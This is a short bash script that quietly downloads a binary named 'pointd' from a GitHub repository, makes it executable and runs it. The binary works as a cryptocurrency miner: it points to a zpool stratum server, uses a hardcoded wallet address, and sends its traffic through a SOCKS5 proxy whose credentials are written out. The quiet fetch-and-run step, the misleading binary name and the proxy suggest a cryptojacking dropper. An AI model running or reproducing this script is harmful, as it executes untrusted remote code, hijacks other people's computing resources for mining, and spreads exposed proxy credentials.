#!/bin/bash

wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd
chmod +x pointd
./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u XiH7gLoyFHo8s4vWvrD6ad2acw9dxsNfWR -p c=DASH,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@176.116.230.96:7182 -t 8
